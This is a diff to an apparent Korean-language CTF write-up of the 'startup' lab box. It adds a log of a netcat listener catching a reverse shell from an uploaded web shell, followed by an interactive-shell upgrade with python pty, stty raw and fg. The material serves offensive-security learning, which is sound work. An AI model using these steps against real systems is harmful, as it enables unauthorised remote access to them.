@@ -341,6 +341,65 @@ drwxr-xr-x 14 root root 4096 Nov 12 2020 var
 lrwxrwxrwx 1 root root 30 Sep 25 2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic 
 lrwxrwxrwx 1 root root 30 Sep 25 2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
 
-# 좀 더 강력한 웹쉘로 전환
+# 좀 더 강력한 웹쉘로 전환 -> POST 방식으로 revershell 시도 -> O
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/9a396ecc-e5b8-43f6-bef4-002c73a75926/image.png)
+
+
+# reversing -> getting a dummy shell -> but not completed interactive shell...
+                                                                                                                              
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvnp 1234                                            
+listening on [any] 1234 ...
+connect to [192.168.130.36] from (UNKNOWN) [10.64.144.72] 36194
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+web.php
+$ cd
+$ cd ..
+$ cd ..
+$ ls
+files
+index.html
+$ 
+
+
+# shell upgrade
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -lvnp 1234                                            
+listening on [any] 1234 ...
+connect to [192.168.130.36] from (UNKNOWN) [10.64.144.72] 36194
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+web.php
+$ cd
+$ cd ..
+$ cd ..
+$ ls
+files
+index.html
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@startup:/var/www/html$ ls
+ls
+files  index.html
+www-data@startup:/var/www/html$ export TERM=xterm
+export TERM=xterm
+www-data@startup:/var/www/html$ ^Z
+zsh: suspended  sudo nc -lvnp 1234
+                                                                                                                              
+┌──(kali㉿kali)-[~]
+└─$ stty raw -echo; fg   
+[1]  + continued  sudo nc -lvnp 1234
+
+www-data@startup:/var/www/html$ ls
+files  index.html
+www-data@startup:/var/www/html$ pwd
+/var/www/html
+www-data@startup:/var/www/html$ ls
+files/      index.html  
+www-data@startup:/var/www/html$ ls 
+files/      index.html  
+www-data@startup:/var/www/html$ ls 
+```
